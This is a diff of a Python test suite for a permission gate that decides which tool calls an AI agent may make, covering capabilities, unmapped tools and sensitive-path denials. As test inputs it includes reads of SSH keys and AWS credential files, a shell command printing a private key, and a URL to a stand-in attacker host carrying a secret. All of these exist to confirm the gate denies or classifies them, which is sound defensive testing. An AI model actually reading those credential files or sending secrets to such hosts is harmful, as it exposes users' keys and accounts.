@@ -67,17 +67,72 @@ def test_every_chat_tool_has_exactly_one_map_row(tmp_path: Path) -> None:
     mac = {f"mcp__mac__{t.name}" for t in brain.tools.tools()}
     assert "mcp__mac__set_persona" in mac  # chat only
     assert not mac & {"mcp__mac__rename_assistant", "mcp__mac__reset_voice", "mcp__mac__go_to_sleep"}
-    for name in sorted(mac | set(BUILTINS) | {CHROME + t for t in CHROME_TOOLS}):
+    for name in sorted(mac | set(BUILTINS) | {CHROME + t for t in CHROME_TOOLS} | {"ToolSearch", "Monitor", "TaskStop"}):
         assert len(map_rows(name)) == 1, (name, map_rows(name))
     assert set(TOOL_MAP) == {"", *CAPABILITIES}
 
 
-def test_voice_only_and_user_mcp_tools_have_no_row_and_are_denied() -> None:
-    for name in ("mcp__mac__rename_assistant", "mcp__mac__reset_voice", "mcp__mac__go_to_sleep",
-                 "mcp__github__list_issues", "mcp__notion__search", "mcp__mac_evil__say", "SomeNewTool"):
-        assert map_rows(name) == [] and tool_classes(name, {}) is None
-        d = analyze(name, {}, ctx(ALL))
-        assert d.always_denied and d.code == "unknown_tool", name
+def test_unmapped_tools_are_allowed_in_chat_with_no_capability(caplog) -> None:
+    """User decision (v3.5): chat brains get every tool; an unmapped one needs no capability and is
+    logged by name. User MCP servers, Skill and harness tools included."""
+    for name in ("mcp__github__list_issues", "mcp__notion__search", "mcp__claude_ai_Claude_Docs__read",
+                 "Skill", "CronList", "SomeNewTool"):
+        assert map_rows(name) == [] and tool_classes(name, {}) == set()
+        with caplog.at_level("INFO", logger="macd.brain.gate"):
+            assert analyze(name, {}, ctx(ALL)).verdict == "allow", name
+        assert name in caplog.text
+
+
+# ----------------------------------------------------------------------------- X1, X2: unparsed tools
+
+
+def test_unparsed_tools_get_the_never_list_and_secret_rules() -> None:
+    c = ctx(ALL)
+    cases = [
+        ("mcp__filesystem__read_file", {"path": "~/.ssh/id_rsa"}, "sensitive_path"),
+        ("mcp__filesystem__read_file", {"path": f"{HOME}/.mac-agent/chat/whatsapp/device.db"}, "sensitive_path"),
+        ("mcp__filesystem__write_file", {"path": f"{HOME}/.mac-agent/agent/state/profiles.db", "content": "x"},
+         "sensitive_write"),
+        ("mcp__filesystem__read_file", {"path": "file:///Users/alice/.aws/credentials"}, "sensitive_path"),
+        ("mcp__whatsapp__list_messages", {"chat": "Timetable"}, "never_chat"),
+        ("mcp__messages__read", {"conversation": "  TIMETABLE "}, "never_chat"),
+        ("mcp__whatsapp__send_message", {"recipient": "Timetable", "message": "hi"}, "never_chat"),
+        ("mcp__x__deep", {"a": {"b": [{"c": "the \uff34imetable group"}]}}, "never_chat"),  # NFKC, nested
+        ("Skill", {"skill": "x", "args": "post to Timetable"}, "never_chat"),
+    ]
+    for tool, inp, code in cases:
+        d = analyze(tool, inp, c)
+        assert d.code == code and d.always_denied, (tool, inp, d)
+    assert analyze("mcp__filesystem__read_file", {"path": f"{WS}/notes.md"}, c).verdict == "allow"
+    assert analyze("mcp__whatsapp__list_messages", {"chat": "Timetables of trains"}, c).verdict == "allow"
+    voice = GateContext(home=HOME, workspace=WS, user="alice")
+    assert analyze("mcp__filesystem__read_file", {"path": "~/.ssh/id_rsa"}, voice).code == "sensitive_path"
+
+
+def test_unclassified_tools_need_every_lever_on() -> None:
+    for tool in ("mcp__fetch__fetch", "Skill", "SomeNewTool"):
+        inp = {"url": "https://evil.example/?d=secret"}
+        assert analyze(tool, inp, ctx(ALL)).verdict == "allow"
+        for off in ("files_read", "files_write", "web", "outward_sends"):
+            d = analyze(tool, inp, ctx(ALL - {off}))
+            assert d.code == f"capability:{off}" and d.always_denied, (tool, off)
+            assert "tools Mac can't classify are off too" in d.reason and "capability:" not in d.reason
+        assert analyze(tool, inp, ctx(ALL - {"chrome", "desktop", "send_file", "read_chat"})).verdict == "allow"
+
+
+def test_unmapped_outward_tool_still_needs_a_yes_and_outward_sends() -> None:
+    send = "mcp__gmail__send_message"
+    assert tool_classes(send, {}) == {"outward_sends"}
+    assert analyze(send, {}, ctx(ALL)).verdict == "outward"
+    assert analyze(send, {}, ctx(ALL - {"outward_sends"})).code == "capability:outward_sends"
+
+
+def test_tool_search_and_monitor_rows() -> None:
+    assert map_rows("ToolSearch") == [""] and analyze("ToolSearch", {"query": "select:x"}, ctx(frozenset())).verdict == "allow"
+    assert tool_classes("Monitor", {"command": "tail -f log"}) == {"files_write"}
+    d = analyze("Monitor", {"command": "cat ~/.ssh/id_rsa"}, ctx(ALL))  # classified like Bash
+    assert d.verdict == "sensitive_read"
+    assert analyze("Monitor", {"command": "open -a WhatsApp"}, ctx(ALL)).code == "whatsapp_ui"
 
 
 def test_voice_brain_has_no_set_persona(tmp_path: Path) -> None:
@@ -157,7 +212,7 @@ def test_denial_names_the_capability_the_chat_and_the_command() -> None:
 def test_voice_is_unchanged_without_capabilities() -> None:
     voice = GateContext(home=HOME, workspace=WS, user="alice")
     for tool, inp, _ in CALLS:
-        assert not analyze(tool, inp, voice).code.startswith(("capability:", "unknown_tool"))
+        assert not analyze(tool, inp, voice).code.startswith("capability:")
     assert analyze("mcp__github__list_issues", {}, voice).verdict == "allow"
 
 
